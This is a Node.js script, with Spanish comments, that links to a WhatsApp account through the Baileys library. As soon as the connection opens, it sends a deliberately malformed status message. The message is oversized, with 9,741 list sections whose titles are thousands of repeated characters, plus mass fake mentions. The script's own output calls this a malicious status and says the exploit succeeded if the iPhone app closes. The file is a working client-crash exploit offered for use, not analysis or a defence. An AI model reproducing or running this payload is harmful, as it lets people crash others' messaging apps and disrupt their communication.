const { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const P = require("pino");
const fs = require("fs");
const QRCode = require("qrcode-terminal");

// ========== LEE EL NÚMERO (opcional, solo para pairing) ==========
// Si usas QR, no es necesario, pero lo dejamos por si acaso
const PHONE_NUMBER = process.env.PHONE_NUMBER || "";

async function start() {
    const { state, saveCreds } = await useMultiFileAuthState("auth");
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        auth: state,
        version,
        logger: P({ level: "silent" }),
        browser: ["Ubuntu", "Chrome", "120.0.0"],
        printQRInTerminal: true  // ✅ Esto muestra el QR en la consola
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;

        // ✅ Mostrar QR en la consola (por si no se imprime automáticamente)
        if (qr) {
            console.log("\n📲 ESCANEA ESTE QR CON WHATSAPP (Dispositivos vinculados > Vincular con código QR)\n");
            QRCode.generate(qr, { small: true });
        }

        if (connection === "open") {
            console.log("\n✅ Conectado a WhatsApp\n");
            await crashExploit(sock);
        }

        if (connection === "close") {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) {
                console.log("🔄 Reconectando...");
                start();
            } else {
                console.log("🔒 Sesión cerrada. Elimina la carpeta auth y vuelve a intentar.");
            }
        }
    });

    // Si no hay credenciales y no se generó QR automáticamente, intentar pairing
    if (!sock.authState.creds.registered && !process.env.SKIP_PAIRING) {
        try {
            const code = await sock.requestPairingCode(PHONE_NUMBER);
            console.log("\n🔑 Código de vinculación (alternativo):", code);
            console.log("📲 Usa este código si el QR no funciona.\n");
        } catch (e) {
            console.log("❌ El QR debería estar disponible en los logs. Escanéalo para conectar.");
        }
    }
}

async function crashExploit(sock) {
    // ========== CREAR EL ESTADO MALICIOSO ==========
    const delaymention = Array.from({ length: 9741 }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "〽",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🌀" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: "status@broadcast",
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "0@newsletter",
                            serverMessageId: 1,
                            newsletterName: "〽"
                        }
                    },
                    description: "〽"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent("status@broadcast", MSG, {});

    try {
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: ["status@broadcast"],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: { jid: "status@broadcast" },
                        content: undefined
                    }]
                }]
            }]
        });
        console.log("\n💀 ¡Estado malicioso enviado! Abre WhatsApp en tu iPhone y ve al estado...");
        console.log("⚠️ Si la app se cierra, el exploit funcionó.");
    } catch (e) {
        console.log("❌ Error al enviar:", e.message);
    }
}

start();